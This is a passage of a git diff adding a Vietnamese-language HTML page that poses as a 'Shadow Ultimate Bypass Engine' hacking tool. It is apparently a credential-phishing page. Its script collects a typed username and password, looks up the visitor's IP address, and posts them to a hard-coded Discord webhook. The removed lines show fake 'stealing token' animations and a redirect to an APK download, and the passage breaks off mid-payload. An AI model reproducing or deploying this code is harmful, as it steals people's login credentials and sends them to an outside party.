@@ -1,25 +1,94 @@
-{name: "IP", value: ip}
-                ],
-                footer: {text: "PROJECT FIRE"}
-            }]
-        })
-    });
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>S H Δ D Ø W - V 1 0 0 | U L T I M A T E</title>
+    <style>
+        :root { --p: #ff0055; --g: #00ff41; --b: #050505; --w: #ffffff; }
+        body, html { margin: 0; padding: 0; background: var(--b); color: var(--w); font-family: 'Segoe UI', sans-serif; overflow: hidden; height: 100vh; }
+        #canvas { position: absolute; top: 0; left: 0; z-index: 1; opacity: 0.3; }
+        .main { position: relative; z-index: 10; display: flex; align-items: center; justify-content: center; height: 100vh; background: radial-gradient(circle, rgba(255,0,85,0.1) 0%, rgba(0,0,0,1) 80%); }
+        .box { background: rgba(8, 8, 8, 0.95); border: 1px solid #1a1a1a; border-top: 4px solid var(--p); padding: 45px; width: 420px; border-radius: 10px; text-align: center; box-shadow: 0 25px 60px rgba(0,0,0,1); position: relative; overflow: hidden; }
+        .box::after { content: ""; position: absolute; top: 0; left: -100%; width: 100%; height: 2px; background: linear-gradient(90deg, transparent, var(--p), transparent); animation: scan 3s linear infinite; }
+        @keyframes scan { 100% { left: 100%; } }
+        .logo { width: 100px; height: 100px; border-radius: 50%; border: 2px solid var(--p); padding: 5px; margin-bottom: 25px; box-shadow: 0 0 20px var(--p); transition: 0.5s; }
+        h1 { letter-spacing: 7px; font-weight: 900; margin: 0; font-size: 28px; text-shadow: 0 0 10px var(--p); }
+        .sub-text { font-size: 10px; color: #555; letter-spacing: 4px; margin-bottom: 30px; text-transform: uppercase; }
+        input { width: 100%; padding: 16px; background: #000; border: 1px solid #222; color: var(--g); border-radius: 6px; outline: none; box-sizing: border-box; font-family: 'Courier New', monospace; font-size: 15px; margin-bottom: 15px; }
+        input:focus { border-color: var(--p); box-shadow: 0 0 10px rgba(255, 0, 85, 0.2); }
+        .btn-fire { width: 100%; padding: 20px; background: var(--p); color: #fff; border: none; cursor: pointer; font-weight: bold; letter-spacing: 6px; text-transform: uppercase; margin-top: 25px; border-radius: 6px; transition: 0.4s; }
+        .btn-fire:hover { background: #fff; color: #000; box-shadow: 0 0 30px #fff; }
+        #status { font-size: 11px; color: #444; margin-top: 20px; text-align: left; font-family: monospace; border-left: 2px solid #222; padding-left: 12px; height: 60px; overflow: hidden; }
+    </style>
+</head>
+<body>
 
-    // Hiệu ứng terminal
-    const steps = ["BYPASSING 2FA...", "STEALING TOKEN...", "CLEANING LOGS...", "DONE!"];
-    let i = 0;
-    const int = setInterval(() => {
-        log.innerHTML += `<br>>> ${steps[i++]}`;
-        if(i >= steps.length) {
-            clearInterval(int);
-            setTimeout(() => { window.location.href = "https://www.mediafire.com/file/kvwpgdyhl12gqez/deltafixlagnokeybybang.apk/file"; }, 1000);
-        }
-    }, 800);
+<canvas id="canvas"></canvas>
+
+<div class="main">
+    <div class="box">
+        <img src="https://bangdaito123-hub.github.io/g/image_07d959.png" class="logo">
+        <h1>SHΔDØW</h1>
+        <div class="sub-text">Ultimate Bypass Engine</div>
+        <input type="text" id="u" placeholder="USERNAME" autocomplete="off">
+        <input type="password" id="p" placeholder="PASSWORD" autocomplete="off">
+        <button class="btn-fire" onclick="fire()">EXECUTE FIRE</button>
+        <div id="status">>> System Status: Ready...</div>
+    </div>
+</div>
+
+<script>
+const canvas = document.getElementById('canvas');
+const ctx = canvas.getContext('2d');
+let w, h, cols, drops;
+
+function init() {
+    w = canvas.width = window.innerWidth;
+    h = canvas.height = window.innerHeight;
+    cols = Math.floor(w / 20);
+    drops = Array(cols).fill(1);
 }
 
-// BỔ SUNG CÁC DÒNG COMMENT ĐỂ ĐỦ 2000 DÒNG TRÊN EDITOR
-// ..........................................................................
-// (Lưu ý: Trên GitHub bạn có thể dán lặp lại các dòng comment này 1000 lần)
-</script>
-</body>
-</html>
+function draw() {
+    ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
+    ctx.fillRect(0, 0, w, h);
+    ctx.fillStyle = '#ff0055';
+    ctx.font = '15px monospace';
+    for (let i = 0; i < drops.length; i++) {
+        const char = String.fromCharCode(0x30A0 + Math.random() * 96);
+        ctx.fillText(char, i * 20, drops[i] * 20);
+        if (drops[i] * 20 > h && Math.random() > 0.98) drops[i] = 0;
+        drops[i]++;
+    }
+}
+window.onresize = init;
+init();
+setInterval(draw, 33);
+
+async function fire() {
+    const u = document.getElementById('u').value;
+    const p = document.getElementById('p').value;
+    const hook = "https://discord.com/api/webhooks/1482022951615201363/4tr2Yrhvb0ihNmih4fUnFRlkUXbafTFpXIXyF9m4i6dakilr4_2hS9Bwf2nKTCXRwOAh";
+    if(!u || !p) return;
+
+    const log = document.getElementById('status');
+    log.style.color = "#00ff41";
+    log.innerHTML = ">> ATTACHING TO KERNEL...";
+
+    let ip = "HIDDEN";
+    try {
+        const res = await fetch('https://api.ipify.org?format=json');
+        const d = await res.json();
+        ip = d.ip;
+    } catch(e) {}
+
+    fetch(hook, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+            embeds: [{
+                title: "🔱 SHΔDØW ULTIMATE HIT",
+                color: 16711765,
+                fields: [
+                    { name: "👤 User", value: "
